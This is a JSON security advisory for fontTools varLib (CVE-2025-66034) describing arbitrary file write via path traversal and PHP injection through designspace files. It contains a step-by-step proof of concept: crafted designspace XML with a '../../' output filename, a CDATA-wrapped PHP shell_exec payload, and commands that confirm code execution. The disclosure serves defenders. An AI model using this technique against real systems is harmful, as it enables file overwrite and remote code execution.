{
  "id": "GHSA-768j-98cg-p3fv",
  "modified": "2025-12-01T19:21:27.883082Z",
  "published": "2025-12-01T19:07:00Z",
  "aliases": [
    "CVE-2025-66034"
  ],
  "summary": "fontTools is Vulnerable to Arbitrary File Write and XML injection in fontTools.varLib",
  "details": "## Summary\n\nThe `fonttools varLib` (or `python3 -m fontTools.varLib`) script has an arbitrary file write vulnerability that leads to remote code execution when a malicious .designspace file is processed. The vulnerability affects the `main()` code path of `fontTools.varLib`, used by the fonttools varLib CLI and any code that invokes `fontTools.varLib.main()`.\n\nThe vulnerability exists due to unsanitised filename handling combined with content injection. Attackers can write files to arbitrary filesystem locations via path traversal sequences, and inject malicious code (like PHP) into the output files through XML injection in labelname elements. When these files are placed in web-accessible locations and executed, this achieves remote code execution without requiring any elevated privileges. Once RCE is obtained, attackers can further escalate privileges to compromise system files (like overwriting `/etc/passwd`).\n\nOverall this allows attackers to:\n- Write font files to arbitrary locations on the filesystem\n- Overwrite configuration files\n- Corrupt application files and dependencies\n- Obtain remote code execution\n\nThe attacker controls the file location, extension and contents which could lead to remote code execution as well as enabling a denial of service through file corruption means.\n\n## Affected Lines\n\n`fontTools/varLib/__init__.py`\n```python\nfilename = vf.filename # Unsanitised filename\noutput_path = os.path.join(output_dir, filename) # Path traversal\nvf.save(output_path) # Arbitrary file write\n```\n\n## PoC\n1. Set up `malicious.designspace` and respective `source-*.ttf` files in a directory like `/Users/\u003cusername\u003e/testing/demo/` (will impact relative file location within malicious.designspace)\n\n`setup.py`\n```python\n#!/usr/bin/env python3\nimport os\n\nfrom fontTools.fontBuilder import FontBuilder\nfrom fontTools.pens.ttGlyphPen import TTGlyphPen\n\ndef create_source_font(filename, weight=400):\n    fb = FontBuilder(unitsPerEm=1000, isTTF=True)\n    fb.setupGlyphOrder([\".notdef\"])\n    fb.setupCharacterMap({})\n    \n    pen = TTGlyphPen(None)\n    pen.moveTo((0, 0))\n    pen.lineTo((500, 0))\n    pen.lineTo((500, 500))\n    pen.lineTo((0, 500))\n    pen.closePath()\n    \n    fb.setupGlyf({\".notdef\": pen.glyph()})\n    fb.setupHorizontalMetrics({\".notdef\": (500, 0)})\n    fb.setupHorizontalHeader(ascent=800, descent=-200)\n    fb.setupOS2(usWeightClass=weight)\n    fb.setupPost()\n    fb.setupNameTable({\"familyName\": \"Test\", \"styleName\": f\"Weight{weight}\"})\n    fb.save(filename)\n\nif __name__ == '__main__':\n    os.chdir(os.path.dirname(os.path.abspath(__file__)))\n    create_source_font(\"source-light.ttf\", weight=100)\n    create_source_font(\"source-regular.ttf\", weight=400)\n```\n\n`malicious.designspace`\n```xml\n\u003c?xml version='1.0' encoding='UTF-8'?\u003e\n\u003cdesignspace format=\"5.0\"\u003e\n  \u003caxes\u003e\n    \u003caxis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\"/\u003e\n  \u003c/axes\u003e\n  \n  \u003csources\u003e\n    \u003csource filename=\"source-light.ttf\" name=\"Light\"\u003e\n      \u003clocation\u003e\n        \u003cdimension name=\"Weight\" xvalue=\"100\"/\u003e\n      \u003c/location\u003e\n    \u003c/source\u003e\n    \u003csource filename=\"source-regular.ttf\" name=\"Regular\"\u003e\n      \u003clocation\u003e\n        \u003cdimension name=\"Weight\" xvalue=\"400\"/\u003e\n      \u003c/location\u003e\n    \u003c/source\u003e\n  \u003c/sources\u003e\n  \n  \u003c!-- Filename can be arbitrarily set to any path on the filesystem --\u003e\n  \u003cvariable-fonts\u003e\n    \u003cvariable-font name=\"MaliciousFont\" filename=\"../../tmp/newarbitraryfile.json\"\u003e\n      \u003caxis-subsets\u003e\n        \u003caxis-subset name=\"Weight\"/\u003e\n      \u003c/axis-subsets\u003e\n    \u003c/variable-font\u003e\n  \u003c/variable-fonts\u003e\n\u003c/designspace\u003e\n```\n\nOptional: You can put a file with any material within `../../tmp/newarbitraryfile.json` in advance, the contents in the file will be overwritten after running the setup script in the following step.\n\n2. Run the setup.py script to generate `source-*.tff` files required for the malicious.designspace file.\n```bash\npython3 setup.py\n```\n3. Execute the given payload using the vulnerable varLib saving the file into the arbitrary file location of filename\n```bash\nfonttools varLib malicious.designspace\n```\n4. Validate arbitrary file write was performed by looking at path assigned within malicious designspace\n```bash\ncat {{filename_location}}\n```\n5. After validating that we can provide arbitrary write to any location, we can also validate that we can control sections of content as well demonstrated with the below payload.\n\n`malicious2.designspace`\n```xml\n\u003c?xml version='1.0' encoding='UTF-8'?\u003e\n\u003cdesignspace format=\"5.0\"\u003e\n\t\u003caxes\u003e\n        \u003c!-- XML injection occurs in labelname elements with CDATA sections --\u003e\n\t    \u003caxis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\"\u003e\n\t        \u003clabelname xml:lang=\"en\"\u003e\u003c![CDATA[\u003c?php echo shell_exec(\"/usr/bin/touch /tmp/MEOW123\");?\u003e]]]]\u003e\u003c![CDATA[\u003e]]\u003e\u003c/labelname\u003e\n\t        \u003clabelname xml:lang=\"fr\"\u003eMEOW2\u003c/labelname\u003e\n\t    \u003c/axis\u003e\n\t\u003c/axes\u003e\n\t\u003caxis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\"/\u003e\n\t\u003csources\u003e\n\t\t\u003csource filename=\"source-light.ttf\" name=\"Light\"\u003e\n\t\t\t\u003clocation\u003e\n\t\t\t\t\u003cdimension name=\"Weight\" xvalue=\"100\"/\u003e\n\t\t\t\u003c/location\u003e\n\t\t\u003c/source\u003e\n\t\t\u003csource filename=\"source-regular.ttf\" name=\"Regular\"\u003e\n\t\t\t\u003clocation\u003e\n\t\t\t\t\u003cdimension name=\"Weight\" xvalue=\"400\"/\u003e\n\t\t\t\u003c/location\u003e\n\t\t\u003c/source\u003e\n\t\u003c/sources\u003e\n\t\u003cvariable-fonts\u003e\n\t\t\u003cvariable-font name=\"MyFont\" filename=\"output.ttf\"\u003e\n\t\t\t\u003caxis-subsets\u003e\n\t\t\t\t\u003caxis-subset name=\"Weight\"/\u003e\n\t\t\t\u003c/axis-subsets\u003e\n\t\t\u003c/variable-font\u003e\n\t\u003c/variable-fonts\u003e\n\t\u003cinstances\u003e\n\t\t\u003cinstance name=\"Display Thin\" familyname=\"MyFont\" stylename=\"Thin\"\u003e\n\t\t\t\u003clocation\u003e\u003cdimension name=\"Weight\" xvalue=\"100\"/\u003e\u003c/location\u003e\n\t\t\t\u003clabelname xml:lang=\"en\"\u003eDisplay Thin\u003c/labelname\u003e\n\t\t\u003c/instance\u003e\n\t\u003c/instances\u003e\n\u003c/designspace\u003e\n```\n\n6. When the program is run, we can show we control the contents in the new file\n```bash\nfonttools varLib malicious2.designspace -o file123\n```\nHere being outputted to a localised area ignoring filename presented in variable-font\n\n7. We can look inside file123 to validate user controlled injection\n```bash\ncat file123\n```\nto show `\u003c?php echo shell_exec(\"/usr/bin/touch /tmp/MEOW123\");?\u003e]]\u003e`\n\n8. Executing the file and reading looking at the newly generated file\n```bash\nphp file123\nls -la /tmp/MEOW123\n```\nwe can see that the file was just created showing RCE.\n\n## Recommendations\n\n- Ensure output file paths configured within designspace files are restricted to the local directory or consider further security measures to prevent arbitrary file write/overwrite within any directory on the system",
  "affected": [
    {
      "package": {
        "ecosystem": "PyPI",
        "name": "fonttools",
        "purl": "pkg:pypi/fonttools"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "4.33.0"
            },
            {
              "fixed": "4.60.2"
            }
          ]
        }
      ],
      "versions": [
        "4.33.0",
        "4.33.1",
        "4.33.2",
        "4.33.3",
        "4.34.0",
        "4.34.1",
        "4.34.2",
        "4.34.3",
        "4.34.4",
        "4.35.0",
        "4.36.0",
        "4.37.0",
        "4.37.1",
        "4.37.2",
        "4.37.3",
        "4.37.4",
        "4.38.0",
        "4.38.1.dev0",
        "4.39.0",
        "4.39.1",
        "4.39.2",
        "4.39.3",
        "4.39.4",
        "4.40.0",
        "4.41.0",
        "4.41.1",
        "4.42.0",
        "4.42.1",
        "4.43.0",
        "4.43.1",
        "4.44.0",
        "4.44.1",
        "4.44.3",
        "4.45.0",
        "4.45.1",
        "4.46.0",
        "4.47.0",
        "4.47.2",
        "4.48.1",
        "4.49.0",
        "4.50.0",
        "4.51.0",
        "4.52.1",
        "4.52.3",
        "4.52.4",
        "4.53.0",
        "4.53.1",
        "4.54.0",
        "4.54.1",
        "4.55.0",
        "4.55.1",
        "4.55.2",
        "4.55.3",
        "4.55.4",
        "4.55.5",
        "4.55.6",
        "4.55.7",
        "4.55.8",
        "4.56.0",
        "4.57.0",
        "4.58.0",
        "4.58.1",
        "4.58.2",
        "4.58.3",
        "4.58.4",
        "4.58.5",
        "4.59.0",
        "4.59.1",
        "4.59.2",
        "4.60.0",
        "4.60.1"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-768j-98cg-p3fv/GHSA-768j-98cg-p3fv.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/fonttools/fonttools/security/advisories/GHSA-768j-98cg-p3fv"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66034"
    },
    {
      "type": "WEB",
      "url": "https://github.com/fonttools/fonttools/commit/a696d5ba93270d5954f98e7cab5ddca8a02c1e32"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/fonttools/fonttools"
    }
  ]
}